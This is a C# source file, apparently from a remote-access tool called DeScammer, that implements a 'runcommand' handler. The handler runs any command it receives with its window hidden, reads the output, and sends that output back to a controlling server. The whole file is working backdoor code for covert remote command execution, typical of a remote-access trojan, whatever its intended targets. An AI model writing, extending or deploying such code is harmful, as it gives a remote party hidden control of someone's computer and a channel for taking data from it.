using System;
using System.Diagnostics;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using DeScammer.API;

namespace DeScammer.Commands
{
    [Command("runcommand", 1)]
    public class RunCommand : Command
    {
        public override void Execute(string[] args)
        {
            Process p = new Process();
            string output = "";
            string[] sp = args[0].Split(' ');
            string arg = "";

            for(int i = 1; i < sp.Length; i++)
                arg += sp[i] + " ";

            p.StartInfo.FileName = sp[0];
            p.StartInfo.Arguments = arg;
            p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.RedirectStandardOutput = true;
            p.Start();

            output = p.StandardOutput.ReadToEnd();
            p.WaitForExit();

            Variables.Server.Send(CommandManager.FormatCommand("logcmdoutput", new string[] { output }));
        }
    }
}
